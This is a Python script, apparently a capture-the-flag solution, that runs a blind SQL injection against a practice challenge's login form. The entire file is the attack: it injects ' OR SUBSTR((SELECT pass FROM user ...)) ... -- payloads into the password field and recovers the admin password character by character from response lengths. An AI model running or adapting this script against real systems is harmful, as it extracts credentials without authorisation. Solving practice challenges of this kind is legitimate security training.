import urllib.parse
import urllib.request

def httpRequest(id, pw):
    url = 'http://ctfq.sweetduet.info:10080/~q6/'
    values = {'id':id, 'pass':pw}

    data = urllib.parse.urlencode(values)
    data = data.encode('ascii')
    req = urllib.request.Request(url, data)

    response = urllib.request.urlopen(req)
    data = response.read()

    return data

def atkPass(plen):
    flag = ''
    for i in range(0, plen):
        for j in range(48, 123):
            char = chr(j)
            id = "admin"
            pw = "' OR SUBSTR((SELECT pass FROM user WHERE id = 'admin'), {0}, 1) = '{1}' -- ".format(i, char)
            data = httpRequest(id, pw)
            if len(data) > 2000:
                print(chr(j))
                flag += chr(j)
                break
    
    return flag
            

if __name__ == '__main__':
    flag = atkPass(22)
    print(flag)
